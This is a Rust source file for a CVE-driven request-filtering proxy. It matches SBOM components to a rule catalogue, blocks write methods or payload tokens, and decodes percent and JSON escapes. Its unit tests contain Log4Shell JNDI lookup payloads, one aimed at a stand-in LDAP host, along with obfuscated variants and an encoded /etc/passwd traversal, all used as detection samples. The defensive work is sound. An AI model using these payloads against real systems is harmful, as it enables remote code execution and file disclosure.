use crate::sbom::{self, Component};
use aho_corasick::AhoCorasick;
use anyhow::{Context, Result, ensure};
use axum::http::Method;
use semver::{Version, VersionReq};
use serde::{Deserialize, Serialize};
use std::collections::HashSet;

#[derive(Clone, Deserialize, Serialize)]
#[serde(tag = "type", rename_all = "snake_case", deny_unknown_fields)]
pub enum Action {
    DenyAll,
    DenyWrite,
    Tokens { patterns: Vec<String> },
}

impl Action {
    pub(crate) fn validate(&self) -> Result<()> {
        if let Self::Tokens { patterns } = self {
            ensure!(
                !patterns.is_empty()
                    && patterns.len() <= 64
                    && patterns
                        .iter()
                        .all(|p| !p.is_empty() && p.len() <= 256 && p.is_ascii()),
                "token rules need 1–64 ASCII patterns of 1–256 bytes"
            );
        }
        Ok(())
    }
}

#[derive(Clone, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct RuleSpec {
    pub id: String,
    pub cve: String,
    pub packages: Vec<String>,
    pub affected: Vec<String>,
    pub action: Action,
    pub description: String,
    pub source: String,
}

struct Rule {
    spec: RuleSpec,
    ranges: Vec<VersionReq>,
}

pub struct Catalog {
    rules: Vec<Rule>,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct CatalogFile {
    version: u32,
    rules: Vec<RuleSpec>,
}

impl Catalog {
    pub fn parse(bytes: &[u8]) -> Result<Self> {
        ensure!(
            bytes.len() <= sbom::MAX_SBOM_BYTES,
            "catalogue exceeds 64 MiB"
        );
        let file: CatalogFile = serde_json::from_slice(bytes).context("invalid rule catalogue")?;
        ensure!(
            file.version == 1 && !file.rules.is_empty() && file.rules.len() <= 256,
            "expected catalogue version 1 with 1–256 rules"
        );
        let mut ids = HashSet::new();
        let mut rules = Vec::new();
        for mut spec in file.rules {
            ensure!(
                !spec.id.is_empty()
                    && spec.id.len() <= 100
                    && spec
                        .id
                        .bytes()
                        .all(|c| c.is_ascii_alphanumeric() || b"-_.".contains(&c)),
                "invalid rule ID"
            );
            ensure!(ids.insert(spec.id.clone()), "duplicate rule ID");
            ensure!(
                !spec.packages.is_empty() && !spec.affected.is_empty(),
                "rule needs packages and affected ranges"
            );
            ensure!(
                spec.source.starts_with("https://") && spec.cve.starts_with("CVE-"),
                "rule needs a CVE and HTTPS source"
            );
            for package in &mut spec.packages {
                let (identity, version) = sbom::package_identity(package)?;
                ensure!(
                    version.is_none(),
                    "catalogue package IDs must be versionless"
                );
                *package = identity;
            }
            spec.action.validate()?;
            let ranges = spec
                .affected
                .iter()
                .map(|r| VersionReq::parse(r).context("invalid semver range"))
                .collect::<Result<_>>()?;
            rules.push(Rule { spec, ranges });
        }
        Ok(Self { rules })
    }

    pub fn bundled() -> Result<Self> {
        Self::parse(include_bytes!("../rules/default.json"))
    }

    pub fn specs(&self) -> Vec<&RuleSpec> {
        self.rules.iter().map(|r| &r.spec).collect()
    }
}

#[derive(Clone, Serialize)]
pub struct Coverage {
    #[serde(flatten)]
    pub component: Component,
    pub status: &'static str,
    pub active_rules: Vec<String>,
}

#[derive(Clone, Serialize)]
pub struct Report {
    pub components: Vec<Coverage>,
    pub inventory_gaps: Vec<crate::ai::research::InventoryGap>,
    pub active_rules: Vec<RuleSpec>,
    pub generated_rules: Vec<crate::generated::Rule>,
    pub ai: crate::ai::Review,
    pub warning: &'static str,
}

#[derive(Clone)]
pub struct Policy {
    pub report: Report,
    matcher: Option<AhoCorasick>,
    token_rules: Vec<String>,
}

fn version(value: &str) -> Option<Version> {
    let value = value.strip_prefix('v').unwrap_or(value);
    let normalized = match value.matches('.').count() {
        0 => format!("{value}.0.0"),
        1 => format!("{value}.0"),
        _ => value.to_owned(),
    };
    Version::parse(&normalized).ok()
}

impl Policy {
    pub fn compile(components: Vec<Component>, catalog: &Catalog) -> Result<Self> {
        let mut activated = HashSet::new();
        let mut coverage = Vec::new();
        for component in components {
            let parsed = component.version.as_deref().and_then(version);
            // Unknown and prerelease versions activate matching rules conservatively.
            let uncertain = parsed.as_ref().is_none_or(|v| !v.pre.is_empty());
            let relevant: Vec<_> = catalog
                .rules
                .iter()
                .filter(|r| {
                    component
                        .package
                        .as_ref()
                        .is_some_and(|p| r.spec.packages.contains(p))
                })
                .collect();
            let active_rules: Vec<_> = relevant
                .iter()
                .filter(|r| {
                    uncertain
                        || parsed
                            .as_ref()
                            .is_some_and(|v| r.ranges.iter().any(|range| range.matches(v)))
                })
                .map(|r| r.spec.id.clone())
                .collect();
            activated.extend(active_rules.iter().cloned());
            let status = if relevant.is_empty() {
                "no_catalogue_rule"
            } else if uncertain {
                "unknown_version_rules_enabled"
            } else if active_rules.is_empty() {
                "outside_catalogued_ranges"
            } else {
                "rules_enabled"
            };
            coverage.push(Coverage {
                component,
                status,
                active_rules,
            });
        }
        let active_rules: Vec<_> = catalog
            .rules
            .iter()
            .filter(|r| activated.contains(&r.spec.id))
            .map(|r| r.spec.clone())
            .collect();
        let mut policy = Self {
            report: Report {
                inventory_gaps: crate::ai::research::inventory_gaps(&coverage),
                components: coverage,
                active_rules,
                generated_rules: Vec::new(),
                ai: crate::ai::Review::default(),
                warning: "Static mappings remain active while AI is missing, pending or failed. Generated restrictions activate only after a successful AI review and can quarantine this entire upstream. Vulnerability discovery is AI-assessed and non-exhaustive. Missing identities or versions and unreported CVEs remain unknown; payload rules do not prove protection.",
            },
            matcher: None,
            token_rules: Vec::new(),
        };
        policy.rebuild_matcher()?;
        Ok(policy)
    }

    pub(crate) fn add_generated(&mut self, rules: Vec<crate::generated::Rule>) -> Result<()> {
        let mut candidate = self.clone();
        let mut ids: HashSet<_> = candidate
            .report
            .generated_rules
            .iter()
            .map(|r| r.id.clone())
            .collect();
        for rule in rules {
            rule.action.validate()?;
            ensure!(ids.insert(rule.id.clone()), "duplicate generated rule ID");
            candidate.report.generated_rules.push(rule);
        }
        candidate.rebuild_matcher()?;
        *self = candidate;
        Ok(())
    }

    fn rebuild_matcher(&mut self) -> Result<()> {
        let rules = self
            .report
            .active_rules
            .iter()
            .map(|r| (&r.id, &r.action))
            .chain(
                self.report
                    .generated_rules
                    .iter()
                    .map(|r| (&r.id, &r.action)),
            );
        let mut patterns = Vec::new();
        self.token_rules.clear();
        for (id, action) in rules {
            if let Action::Tokens { patterns: tokens } = action {
                for token in tokens {
                    patterns.push(token);
                    self.token_rules.push(id.clone());
                }
            }
        }
        self.matcher = if patterns.is_empty() {
            None
        } else {
            Some(
                AhoCorasick::builder()
                    .ascii_case_insensitive(true)
                    .build(patterns)?,
            )
        };
        Ok(())
    }

    pub fn inspect_method(&self, method: &Method) -> Option<&str> {
        self.report
            .active_rules
            .iter()
            .map(|r| (&r.id, &r.action))
            .chain(
                self.report
                    .generated_rules
                    .iter()
                    .map(|r| (&r.id, &r.action)),
            )
            .find_map(|(id, action)| match action {
                Action::DenyAll => Some(id.as_str()),
                Action::DenyWrite if method != Method::GET && method != Method::HEAD => {
                    Some(id.as_str())
                }
                _ => None,
            })
    }

    fn scan(&self, bytes: &[u8], target: bool) -> Option<&str> {
        if bytes.contains(&0) {
            return Some("nul-byte");
        }
        if target
            && [b"../".as_slice(), b"..\\", b"/.git", b"/.env"]
                .iter()
                .any(|needle| {
                    bytes
                        .windows(needle.len())
                        .any(|w| w.eq_ignore_ascii_case(needle))
                })
        {
            return Some("restricted-target");
        }
        self.matcher
            .as_ref()?
            .find(bytes)
            .map(|m| self.token_rules[m.pattern().as_usize()].as_str())
    }

    /// Raw and decoded views are inspected; the original bytes are always forwarded.
    pub fn inspect_bytes(&self, bytes: &[u8], target: bool) -> Option<&str> {
        if let Some(rule) = self.scan(bytes, target) {
            return Some(rule);
        }
        if !bytes.contains(&b'%') && !bytes.contains(&b'\\') {
            return None;
        }
        let mut current = bytes.to_vec();
        for _ in 0..4 {
            let decoded = decode(&current);
            if decoded == current {
                return None;
            }
            if let Some(rule) = self.scan(&decoded, target) {
                return Some(rule);
            }
            current = decoded;
        }
        (decode(&current) != current).then_some("encoding-depth")
    }
}

fn hex(byte: u8) -> Option<u32> {
    (byte as char).to_digit(16)
}

fn decode(bytes: &[u8]) -> Vec<u8> {
    // shortcut: only percent/JSON escapes; add application-specific decoding before claiming wider coverage.
    let mut output = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%'
            && let Some(pair) = bytes.get(i + 1..i + 3)
            && let (Some(a), Some(b)) = (hex(pair[0]), hex(pair[1]))
        {
            output.push((a * 16 + b) as u8);
            i += 3;
            continue;
        }
        if bytes[i..].starts_with(b"\\u")
            && let Some(digits) = bytes.get(i + 2..i + 6)
        {
            let code = digits
                .iter()
                .try_fold(0, |value, byte| Some(value * 16 + hex(*byte)?));
            if let Some(character) = code.and_then(char::from_u32) {
                output.extend_from_slice(character.encode_utf8(&mut [0; 4]).as_bytes());
                i += 6;
                continue;
            }
        }
        if bytes[i..].starts_with(b"\\\\") || bytes[i..].starts_with(b"\\/") {
            output.push(bytes[i + 1]);
            i += 2;
            continue;
        }
        output.push(bytes[i]);
        i += 1;
    }
    output
}

#[cfg(test)]
mod tests {
    use super::*;

    fn log4j(version: &str) -> Policy {
        Policy::compile(
            vec![Component {
                name: "log4j".into(),
                package: Some("pkg:maven/org.apache.logging.log4j/log4j-core".into()),
                version: Some(version.into()),
                kind: None,
                sources: Vec::new(),
            }],
            &Catalog::bundled().unwrap(),
        )
        .unwrap()
    }

    #[test]
    fn log4j_version_boundaries_and_unknown_versions() {
        for version in ["2.0-beta9", "2.3", "2.12.1", "2.14.1", "unknown"] {
            assert_eq!(log4j(version).report.active_rules.len(), 1, "{version}");
        }
        for version in ["1.2.17", "2.3.1", "2.12.2", "2.15.0", "2.26.0"] {
            assert!(log4j(version).report.active_rules.is_empty(), "{version}");
        }
    }

    #[test]
    fn catches_raw_nested_percent_and_json_escaped_lookups() {
        let policy = log4j("2.14.1");
        for bytes in [
            b"${jndi:ldap://example.invalid/x}".as_slice(),
            b"${${lower:j}ndi:x}",
            b"%2524%257Bjndi:x%257D",
            br"\u0024\u007bjndi:x}",
            br"%5Cu0024%7Bjndi:x}",
        ] {
            assert_eq!(
                policy.inspect_bytes(bytes, false),
                Some("log4shell-lookups")
            );
        }
        assert_eq!(policy.inspect_bytes(b"ordinary request", false), None);
        assert_eq!(log4j("2.15.0").inspect_bytes(b"${legitimate}", false), None);
    }

    #[test]
    fn baseline_blocks_encoded_traversal_nuls_and_excessive_nesting() {
        let policy = log4j("2.26.0");
        assert_eq!(
            policy.inspect_bytes(b"/%252e%252e%252fetc/passwd", true),
            Some("restricted-target")
        );
        assert_eq!(policy.inspect_bytes(b"%00", false), Some("nul-byte"));
        assert_eq!(
            policy.inspect_bytes(b"%252525252541", false),
            Some("encoding-depth")
        );
    }

    #[test]
    fn rsc_uses_precise_ranges_and_blocks_every_non_read_method() {
        for (version, active) in [
            ("19.0.0", true),
            ("19.1.1", true),
            ("19.2.0", true),
            ("19.0.1", false),
            ("19.1.2", false),
            ("19.2.1", false),
        ] {
            let p = Policy::compile(
                vec![Component {
                    name: "RSC".into(),
                    package: Some("pkg:npm/react-server-dom-webpack".into()),
                    version: Some(version.into()),
                    kind: None,
                    sources: Vec::new(),
                }],
                &Catalog::bundled().unwrap(),
            )
            .unwrap();
            assert_eq!(p.inspect_method(&Method::POST).is_some(), active);
            assert!(p.inspect_method(&Method::GET).is_none());
        }
    }

    #[test]
    fn validates_catalogue_and_enables_custom_rules() {
        let bytes = br#"{"version":1,"rules":[{"id":"emergency","cve":"CVE-2026-0000","packages":["pkg:npm/example"],"affected":["<2.0.0"],"action":{"type":"deny_all"},"description":"Example only","source":"https://example.invalid/advisory"}]}"#;
        let catalog = Catalog::parse(bytes).unwrap();
        let p = Policy::compile(
            vec![Component {
                name: "example".into(),
                package: Some("pkg:npm/example".into()),
                version: None,
                kind: None,
                sources: Vec::new(),
            }],
            &catalog,
        )
        .unwrap();
        assert_eq!(p.inspect_method(&Method::GET), Some("emergency"));
        assert_eq!(
            p.report.components[0].status,
            "unknown_version_rules_enabled"
        );
        assert!(Catalog::parse(br#"{"version":2,"rules":[]}"#).is_err());
    }
}
